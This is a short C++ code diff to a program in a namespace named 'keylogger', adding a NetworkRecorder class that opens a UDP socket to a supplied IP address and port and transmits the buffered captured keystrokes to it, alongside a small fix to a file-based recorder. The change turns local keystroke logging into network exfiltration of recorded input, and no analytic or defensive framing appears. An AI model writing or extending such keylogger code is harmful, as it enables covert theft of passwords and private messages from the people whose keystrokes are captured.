@@ -1,7 +1,11 @@
 #include "recorder/recorder.h"
 
+#include <cerrno>
+#include <cstring>
 #include <fstream>
+#include <memory>
 #include <stdexcept>
+#include <string>
 
 namespace keylogger {
 
@@ -32,6 +36,26 @@ void FileRecorder::Transmit() {
     throw std::runtime_error("unable to open key log file");
   }
   log_handle.write(keys_.data(), num_keys_);
+  num_keys_ = 0;
+}
+
+NetworkRecorder::NetworkRecorder(int key_limit, const std::string& ip, int port)
+    : Recorder(key_limit) {
+  if (!tx_socket_.Open(ip, port)) {
+    throw std::runtime_error("unable to open udp socket " + ip + ":" +
+                             std::to_string(port));
+  }
+}
+
+void NetworkRecorder::Transmit() {
+  if (!num_keys_) {
+    return;
+  }
+
+  if (tx_socket_.Send(keys_.data(), num_keys_) < 0) {
+    throw std::runtime_error("failed to transmit keys over network -> " +
+                             std::string(std::strerror(errno)));
+  }
   num_keys_ = 0;
 }
 
